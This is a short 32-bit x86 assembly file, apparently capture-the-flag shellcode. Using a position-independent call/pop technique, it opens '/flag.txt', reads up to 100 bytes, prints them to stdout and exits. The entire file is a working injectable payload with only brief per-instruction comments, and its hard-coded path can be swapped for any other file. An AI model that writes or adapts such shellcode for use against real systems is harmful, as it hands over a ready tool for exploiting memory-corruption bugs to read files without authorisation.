bits 32

; sys_open
mov eax, 5

; filename
call bottom
db "/flag.txt",0
bottom:
pop ebx

; flags
xor ecx, ecx

; mode
xor edx, edx

; call
int 0x80

; ============

; fd
mov ebx, eax

; sys_read
mov eax, 3

; buffer
jmp bottom2
top2:
pop ecx

; length
mov edx, 100

; Save buffer
push ecx

; call
int 0x80

; ============


; len = the length we read
mov edx, eax

; sys_write
mov eax, 4

; addr
pop ecx

; fd
mov ebx, 1

; call
int 0x80

; ============

; sys_exit
mov eax, 1
mov ebx, 0
int 0x80


bottom2:
call top2
